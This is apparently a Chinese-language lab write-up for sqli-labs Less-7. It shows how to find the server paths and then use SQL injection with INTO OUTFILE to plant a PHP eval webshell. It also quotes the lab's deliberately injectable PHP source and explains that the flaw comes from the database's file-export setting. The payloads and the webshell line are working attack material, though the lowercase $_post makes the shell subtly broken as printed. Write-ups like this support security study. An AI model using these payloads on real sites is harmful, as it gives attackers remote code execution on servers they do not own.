## Less-7 **GET Dump into Outfile**
TAG：PODTx注入、outfile
## 漏洞利用
输入```?id=1```时返回
![less7_1](images/Less7_1.png)
输入```?id=1'```时返回报错，但是没有详细的报错,这意味着无法进行报错注入  
![less7_2](images/Less7_2.png)  
但是提示打开了数据库outfile，可以将查询到的数据输出到文件中，可以通过这一特性进行一句话木马的上传  

要利用这一特性上传一句话木马，就要先获取网站/数据库的绝对目录，这个信息可以在前几个less中进行获取  
payload:```?id=1' union select 1,@@datadir,@@basedir--+```
![less7_3](images/Less7_3.png)  
获取到绝对路径后，就可以进行一句话木马的写入了  
payload:```?id=1'))UNION SELECT 1,2,'<?php @eval($_post['aaa']);?>' into outfile "C:\\phpstudy_pro\\WWW\\sqli\\Less-7\\1.php%22--+```
写入成功后就可以使用菜刀连接了  

## 源码分析  
### less7源码：
```
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-7 Dump into Outfile</title>

</head>

<body bgcolor="#000000">

<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">


<?php
//including the Mysql connect parameters.
include("../sql-connections/sql-connect.php");
error_reporting(0);
// take the variables
if(isset($_GET['id']))
{
$id=$_GET['id'];
//logging the connection parameters to a file for analysis.
$fp=fopen('result.txt','a');
fwrite($fp,'ID:'.$id."\n");
fclose($fp);

// connectivity 


$sql="SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1";
$result=mysql_query($sql);
$row = mysql_fetch_array($result);

	if($row)
	{
  	echo '<font color= "#FFFF00">';	
  	echo 'You are in.... Use outfile......';
  	echo "<br>";
  	echo "</font>";
  	}
	else 
	{
	echo '<font color= "#FFFF00">';
	echo 'You have an error in your SQL syntax';
	//print_r(mysql_error());
	echo "</font>";  
	}
}
	else { echo "Please input the ID as parameter with numeric value";}

?>
</font> </div></br></br></br><center>
<img src="../images/Less-7.jpg" /></center>
</body>
</html>
```
### 漏洞点分析：
通过阅读与分析此less代码并不能很直接的获取到漏洞的信息，因为此漏洞建立在对数据库的错误配置上，没有关闭数据库文件导出的功能或对其进行合理限制  
